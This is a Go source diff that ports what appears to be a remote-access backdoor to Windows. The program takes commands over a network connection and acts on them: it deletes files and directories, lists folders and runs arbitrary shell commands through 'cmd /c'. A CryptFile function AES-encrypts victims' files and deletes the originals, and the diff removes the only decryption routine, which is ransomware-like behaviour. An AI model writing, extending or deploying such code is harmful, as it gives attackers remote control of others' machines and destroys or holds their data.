@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -46,12 +47,12 @@ func main() {
 		}
 
 		if strings.HasPrefix(message, "dirm") {
-			exec.Command("rm", "-rf", message[5:]).Output()
+			os.RemoveAll(message[5:])
 			conn.Write([]byte("delete - ok"))
 		}
 
 		if strings.HasPrefix(message, "rm") {
-			exec.Command("rm", message[3:]).Output()
+			exec.Command("cmd", "/c ", "del", message[3:]).Output()
 			conn.Write([]byte("delete - ok"))
 		}
 
@@ -101,8 +102,12 @@ func main() {
 		}
 
 		if message == "pwd" {
-			comm := command("pwd")
-			conn.Write([]byte(comm))
+			dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
+			if err != nil {
+				conn.Write([]byte("error"))
+			} else {
+				conn.Write([]byte(dir))
+			}
 		}
 
 		if message == "ifconfig" {
@@ -121,7 +126,7 @@ func CryptFile(name, path, password string) string {
 	file, _ := ioutil.ReadFile(path)
 	text := []byte(file)
 	key := []byte(password)
-	exec.Command("rm", path).Output()
+	exec.Command("cmd", "/c ", "del", path).Output()
 	cr, err := aes.NewCipher(key)
 	if err != nil {
 		return "error new cipher"
@@ -143,38 +148,29 @@ func CryptFile(name, path, password string) string {
 	return "crypt " + name + " sucessful"
 }
 
-/*
-func DecryptFile(name, path, password  string) string {
-	ciphertext, err := ioutil.ReadFile(path)
-	if err != nil { return "error ReadFile" }
-	key := []byte(password)
-
-	cr, err := aes.NewCipher(key)
-	if err != nil { return "error new cipher" }
-	gcm, err := cipher.NewGCM(cr)
-	if err != nil { return "error new GCM" }
-	nonceSize := gcm.NonceSize()
-	if len(ciphertext) < nonceSize { return "error NonceSize" }
-	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil { return "error GCM" }
-	data, err := ioutil.WriteFile(path, string(plaintext), 0777)
-	if err != nil { return "error Write File" }
-
-	return "decrypt " + name + " sucessful"
-} */
-
 func ls_comm(text string) string {
+	var ret string
 	if len(text) > 2 {
-		cmd, _ := exec.Command("ls", text[3:]).Output()
-		return string(cmd)
+		data, err := ioutil.ReadDir(text[3:])
+		if err != nil {
+			return "directory exist"
+		}
+		for _, file := range data {
+			ret += file.Name() + "\n"
+		}
 	} else {
-		cmd, _ := exec.Command("ls").Output()
-		return string(cmd)
+		data, err := ioutil.ReadDir(".")
+		if err != nil {
+			return "directory exist"
+		}
+		for _, file := range data {
+			ret += file.Name() + "\n"
+		}
 	}
+	return ret
 }
 
 func command(text string) string {
-	cmd, _ := exec.Command(text).Output()
-	return string(cmd)
+	cmd, _ := exec.Command("cmd", "/c ", text).Output()
+	return string(cmd)[30:]
 }
